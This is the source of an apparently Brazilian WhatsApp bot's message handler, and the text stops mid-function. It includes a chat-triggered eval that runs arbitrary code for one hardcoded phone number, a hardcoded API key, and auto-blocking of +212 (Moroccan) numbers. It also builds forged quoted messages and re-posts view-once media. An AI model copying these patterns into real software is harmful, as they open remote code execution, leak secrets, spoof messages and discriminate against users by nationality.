require('./settings')
require('./lib/listmenu')
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { rentfromGhost, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { msgFilter } = require('./lib/antispam')

const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const { GhostInstaMp4 } = require('./scrape/GhostInstaMp4')
const { GhostIgImg } = require('./scrape/GhostIgImg')
const { GhostFb } = require('./scrape/GhostFb')
const { GhostTwitter } = require('./scrape/GhostTwitter')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const textpro2 = require('./scrape/textpro2')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const Ghostverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteGhost = JSON.parse(fs.readFileSync('./GhostMedia/database/Ghostvn.json'))
const StickerGhost = JSON.parse(fs.readFileSync('./GhostMedia/database/Ghoststicker.json'))
const ImageGhost = JSON.parse(fs.readFileSync('./GhostMedia/database/Ghostimage.json'))
const VideoGhost = JSON.parse(fs.readFileSync('./GhostMedia/database/Ghostvideo.json'))
const BadGhost = JSON.parse(fs.readFileSync('./database/bad.json'))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))



global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// ler banco de dados
let tebaklagu = db.game.tebaklagu = []
let kuismath = db.game.math = []
let vote = db.others.vote = []

module.exports = Lucy = async (Lucy, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "sem nome"
        const botNumber = await Lucy.decodeJid(Lucy.user.id)
        const GhostTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const GhostTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Lucy.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = Ghostverifieduser.includes(sender)
    	const banUser = await Lucy.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        
        //resposta da etiqueta do tema
        
        const GhostStickerEspere = () => {
        let GhostStickerEsp = fs.readFileSync('./GhostMedia/theme/sticker_reply/espere.webp')
        Lucy.sendMessage(from, { sticker: GhostStickerEsp }, { quoted: ftroli })
        }
        const GhostStickWait = () => {
        let GhostStikRep = fs.readFileSync('./GhostMedia/theme/sticker_reply/wait.webp')
        Lucy.sendMessage(from, { sticker: GhostStikRep }, { quoted: m })
        }
        const GhostStickAdmin = () => {
        let GhostStikRep = fs.readFileSync('./GhostMedia/theme/sticker_reply/admin.webp')
        Lucy.sendMessage(from, { sticker: GhostStikRep }, { quoted: m })
        }
        const GhostStickBotAdmin = () => {
        let GhostStikRep = fs.readFileSync('./GhostMedia/theme/sticker_reply/botadmin.webp')
        Lucy.sendMessage(from, { sticker: GhostStikRep }, { quoted: m })
        }
        const GhostStickOwner = () => {
        let GhostStikRep = fs.readFileSync('./GhostMedia/theme/sticker_reply/owner.webp')
        Lucy.sendMessage(from, { sticker: GhostStikRep }, { quoted: m })
        }
        const GhostStickGroup = () => {
        let GhostStikRep = fs.readFileSync('./GhostMedia/theme/sticker_reply/group.webp')
        Lucy.sendMessage(from, { sticker: GhostStikRep }, { quoted: m })
        }
        const GhostStickPrivate = () => {
        let GhostStikRep = fs.readFileSync('./GhostMedia/theme/sticker_reply/private.webp')
        Lucy.sendMessage(from, { sticker: GhostStikRep }, { quoted: m })
        }
        
        const xtime = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
        const xdate = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY')
        const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')  
if(time2 < "00:00:00"){
var Ghostytimewisher = `Boa madrugada 🌌`
 }
 if(time2 < "18:00:00"){
var Ghostytimewisher = `Boa noite 🌃`
 }
 if(time2 < "12:00:00"){
var Ghostytimewisher = `Bom tarde 🌅`
 }
 if(time2 < "05:30:00"){
var Ghostytimewisher = `Bom dia 🌄`
 } 

		if (isEval && senderNumber == "558181718175") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					m.reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await Lucy.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				Lucy.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}

const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.settings[botNumber] = {
    	    anticall: true,
    		status: 0,
    		autobio: false
	    }

} catch (err) {
console.error(err)
}

if (!Lucy.public) {
if (!m.key.fromMe) return
}

//chat counter (console log)
        if (m.message && m.isGroup) {
            Lucy.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Bate-papo em grupo:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MENSAGEM ]')), chalk.black(chalk.bgGreen(`Data ${xdate} e Hora ${xtime}`)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Em'), chalk.green(groupName, m.chat))
        } else {
            Lucy.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Conversa privada:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MENSAGEM ]')), chalk.black(chalk.bgGreen(`Data ${xdate} e Hora ${xtime}`)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
Ghostverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(Ghostverifieduser, null, 2))
}

Lucy.sendPresenceUpdate('unavailable', from)

//AFK
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Não o marque!
ele é AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
Durante ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Você sai do AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
Durante ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//AFK
	    
		// biografia definida automaticamente
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await Lucy.updateProfileStatus(`${Lucy.user.name} | Tempo de execução : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//bloqueio automático 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return Lucy.updateBlockStatus(m.sender, 'block')
}

//Ban automático 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//Kick antispam
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {

console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))

return await Lucy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

}

async function sendLucyMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Lucy.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//mensagem de chat em grupo por Ghost
const replygcGhost = (teks) => {
Lucy.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GhostMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m })
}
const replygcGhost2 = (teks) => {        
sendLucyMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
Lucy.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
Lucy.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

const sendvn = (teks) => {
Lucy.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//resposta automatica
for (let BhosdikaGhost of VoiceNoteGhost) {
if (budy === BhosdikaGhost) {
let audiobuffy = fs.readFileSync(`./GhostMedia/audio/${BhosdikaGhost}.mp3`)
Lucy.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaGhost of StickerGhost){
if (budy === BhosdikaGhost){
let stickerbuffy = fs.readFileSync(`./GhostMedia/sticker/${BhosdikaGhost}.webp`)
Lucy.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaGhost of ImageGhost){
if (budy === BhosdikaGhost){
let imagebuffy = fs.readFileSync(`./GhostMedia/image/${BhosdikaGhost}.jpg`)
Lucy.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaGhost of VideoGhost){
if (budy === BhosdikaGhost){
let videobuffy = fs.readFileSync(`./GhostMedia/video/${BhosdikaGhost}.mp4`)
Lucy.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Nome* : ${pushname}\n├ *Do utilizador* : @${m.sender.split("@")[0]}\n├ *Relógio* : ${time2}\n└ *Mensagem* : ${m.mtype}`
Lucy.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Talvez esteja aberto`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
Lucy.sendMessage(m.chat, {
text:`Desculpe, você foi banido, por favor converse @${creator.split("@")[0]} e boa sorte`,
mentions: [creator],
},
{
quoted:m
})
}

//Falso
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2023,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=558181718175:558181718175\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./GhostMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await Lucy.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Lucy.getName(i)}\nFN:${await Lucy.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Clique aqui para conversar\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let Ghostrecordin = ['recording','composing']
//let Ghostrecordinfinal = Ghostrecordin[Math.floor(Math.random() * Ghostrecordin.length)]

if (global.autoTyping) {
if (command) {
Lucy.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
Lucy.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Lucy.sendMessage(from, {image: { url: Lehd.thumb } , caption: `nome do canal : ${ghed.player_response.videoDetails.author}
Link do Canal : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Título : ${Lehd.meta.title}
Duração : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Baixar vídeo com ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Lucy.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Lucy.sendMessage(from, { image: { url: Puxa.thumb } , caption: `nome do canal : ${PlXz.player_response.videoDetails.author}
Link do Canal : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Título : ${Puxa.meta.title}
Duração : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Baixar áudio com ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Lucy.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
Lucy.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
